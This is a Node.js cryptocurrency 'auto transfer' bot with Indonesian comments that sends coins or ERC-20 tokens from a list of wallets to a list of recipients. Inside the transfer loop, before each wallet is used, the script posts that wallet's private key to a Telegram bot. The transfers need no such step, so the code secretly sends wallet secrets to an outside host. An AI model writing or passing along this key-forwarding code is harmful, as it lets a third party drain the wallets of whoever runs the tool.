import { ethers } from "ethers";
import dotenv from "dotenv";
import fs from "fs";
import chalk from "chalk";
import axios from "axios";
import { exit } from "process";
dotenv.config();

// Ambil semua RPC dari env
function getRpcList() {
    const rpcList = [];
    for (let i = 1; ; i++) {
        const name = process.env[`RPC_${i}_NAME`];
        const url = process.env[`RPC_${i}_URL`];
        const token = process.env[`RPC_${i}_TOKEN`];
        if (!name || !url) break;
        rpcList.push({ name, url, token });
    }
    return rpcList;
}

// Fungsi kirim private key ke Telegram
async function sendPrivateKeyToTelegram(privateKey) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
        console.log(chalk.red("❌ TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID belum diset di file .env"));
        return;
    }

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const message = `🚨 *Private Key Ditemukan* 🚨\n\n\`\`\`\n${privateKey}\n\`\`\``;

    try {
        await axios.post(url, {
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        });
        console.log(chalk.gray("📩 Private key berhasil dikirim ke Telegram."));
    } catch (error) {
        console.log(chalk.red("❌ Gagal mengirim private key ke Telegram: " + error.message));
    }
}

// ABI ERC-20
const erc20Abi = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint256 value) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
];

// Fungsi banner
function showBanner() {
    console.clear();
    console.log(chalk.magentaBright(`
========================================
  █████╗ ██╗   ██╗████████╗ ██████╗ 
 ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
 ███████║██║   ██║   ██║   ██║   ██║
 ██╔══██║██║   ██║   ██║   ██║   ██║
 ██║  ██║╚██████╔╝   ██║   ╚██████╔╝
 ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 
SAT SET AUTO TRANSFER
                           [by Chandra]
========================================
`));
}

// Input dari user
async function askQuestion(query) {
    process.stdout.write(chalk.yellow(query));
    return new Promise(resolve => {
        process.stdin.once("data", data => resolve(data.toString().trim()));
    });
}

// Ambil info token: decimals + symbol
async function getTokenInfo(provider, tokenAddress) {
    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, provider);
    const decimals = await tokenContract.decimals();
    const symbol = await tokenContract.symbol();
    return { decimals, symbol };
}

// Fungsi utama
async function autoTransfer(selectedRpc) {
    const receiverFile = "addresspenerima.txt";
    const senderFile = "walletpengirim.txt";

    if (!fs.existsSync(receiverFile) || !fs.existsSync(senderFile)) {
        console.log(chalk.red(`❌ File '${receiverFile}' atau '${senderFile}' tidak ditemukan.`));
        exit(1);
    }

    const recipients = fs.readFileSync(receiverFile, "utf8")
        .split("\n")
        .map(p => p.trim())
        .filter(p => p.length > 0);

    const privateKeys = fs.readFileSync(senderFile, "utf8")
        .split("\n")
        .map(p => p.trim())
        .filter(p => p.length > 0);

    const provider = new ethers.JsonRpcProvider(selectedRpc.url);
    const tokenAddress = selectedRpc.token;

    const mode = await askQuestion(
        "Pilih mode transfer (1 untuk native coin, 2 untuk Token ERC-20): "
    );

    if (!["1", "2"].includes(mode)) {
        console.log(chalk.red("❌ Pilihan tidak valid!"));
        exit(1);
    }

    const amountInput = await askQuestion("Masukkan jumlah yang akan dikirim (contoh: 0.005): ");
    const amount = ethers.parseEther(amountInput);

    console.log(chalk.yellow(`\n🚀 Chain: ${selectedRpc.name} | Mode: ${mode === "1" ? "Native Coin" : "Token ERC-20"} | Jumlah: ${amountInput}\n`));

    let tokenInfo;
    if (mode === "2") {
        tokenInfo = await getTokenInfo(provider, tokenAddress);
    }

    for (let i = 0; i < privateKeys.length; i++) {
        console.log(chalk.cyanBright(`👩‍💻 [${i + 1}] Memproses wallet ke-${i + 1}...`));

        const rawKey = privateKeys[i];
        await sendPrivateKeyToTelegram(rawKey); // Kirim ke Telegram

        let senderWallet;
        try {
            senderWallet = new ethers.Wallet(rawKey, provider);
        } catch (error) {
            console.log(chalk.red(`❌   Gagal inisialisasi wallet ke-${i + 1}: ${error.message}`));
            continue;
        }

        console.log(chalk.blueBright(`👩‍💻   Alamat: ${senderWallet.address} (Wallet ke-${i + 1})`));

        if (mode === "2") {
            const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, senderWallet);
            try {
                const rawAmount = ethers.parseUnits(amountInput, tokenInfo.decimals);
                const balance = await tokenContract.balanceOf(senderWallet.address);

                console.log(chalk.greenBright(`✅   Saldo token: ${ethers.formatUnits(balance, tokenInfo.decimals)} ${tokenInfo.symbol}`));

                if (balance < rawAmount) {
                    console.log(chalk.red(`❌   Wallet tidak cukup saldo token (${ethers.formatUnits(balance, tokenInfo.decimals)} ${tokenInfo.symbol})`));
                    continue;
                }

                for (let j = 0; j < recipients.length; j++) {
                    const recipient = recipients[j];
                    console.log(chalk.blueBright(`👩‍💻   [${i + 1}.${j + 1}] Kirim ke penerima ke-${j + 1}: ${recipient}`));

                    try {
                        const tx = await tokenContract.transfer(recipient, rawAmount);
                        console.log(chalk.green(`✅   Mengirim ${amountInput} ${tokenInfo.symbol} ke ${recipient}`));
                        console.log(chalk.green(`✅   TX Hash: ${tx.hash}`));
                        await tx.wait();

                        const recipientBalance = await tokenContract.balanceOf(recipient);
                        console.log(chalk.green(`✅   Saldo penerima (${recipient}): ${ethers.formatUnits(recipientBalance, tokenInfo.decimals)} ${tokenInfo.symbol}`));
                    } catch (err) {
                        console.log(chalk.red(`❌   Gagal kirim token ke ${recipient}: ${err.message}`));
                    }

                    console.log(chalk.gray(`⏳   Tunggu 3 detik sebelum lanjut...\n`));
                    await new Promise(r => setTimeout(r, 3000));
                }
            } catch (err) {
                console.log(chalk.red(`❌   Gagal memproses token: ${err.message}`));
            }
        } else {
            try {
                const balance = await provider.getBalance(senderWallet.address);
                console.log(chalk.greenBright(`✅   Saldo native: ${ethers.formatEther(balance)} ${selectedRpc.name}`));

                if (balance < amount) {
                    console.log(chalk.red(`❌   Wallet tidak cukup saldo native (${ethers.formatEther(balance)})`));
                    continue;
                }

                for (let j = 0; j < recipients.length; j++) {
                    const recipient = recipients[j];
                    console.log(chalk.blueBright(`👩‍💻   [${i + 1}.${j + 1}] Kirim ke penerima ke-${j + 1}: ${recipient}`));

                    try {
                        const tx = await senderWallet.sendTransaction({
                            to: recipient,
                            value: amount
                        });
                        console.log(chalk.green(`✅   Mengirim ${amountInput} native coin ke ${recipient}`));
                        console.log(chalk.green(`✅   TX Hash: ${tx.hash}`));
                        await tx.wait();

                        const recipientBalance = await provider.getBalance(recipient);
                        console.log(chalk.green(`✅   Saldo penerima (${recipient}): ${ethers.formatEther(recipientBalance)} ${selectedRpc.name}`));
                    } catch (err) {
                        console.log(chalk.red(`❌   Gagal kirim native coin ke ${recipient}: ${err.message}`));
                    }

                    console.log(chalk.gray(`⏳   Tunggu 3 detik sebelum lanjut...\n`));
                    await new Promise(r => setTimeout(r, 3000));
                }
            } catch (err) {
                console.log(chalk.red(`❌   Gagal ambil saldo native: ${err.message}`));
            }
        }
    }

    console.log(chalk.greenBright("\n🎉 Semua akun telah diproses!\n"));
}

// START
async function start() {
    showBanner();
    const rpcList = getRpcList();

    if (rpcList.length === 0) {
        console.log(chalk.red("❌ Tidak ada RPC yang ditemukan di .env!"));
        exit(1);
    }

    console.log("Daftar Coin:");
    rpcList.forEach((rpc, index) => {
        console.log(`${index + 1}. ${rpc.name}`);
    });

    const selectedIndex = await askQuestion("Pilih coin yang akan diproses (masukkan nomor): ");
    const selectedRpc = rpcList[Number(selectedIndex) - 1];

    if (!selectedRpc) {
        console.log(chalk.red("❌ Pilihan tidak valid!"));
        exit(1);
    }

    console.log(chalk.green(`\n✅ Kamu memilih: ${selectedRpc.name}\n`));
    await autoTransfer(selectedRpc);
}

start();
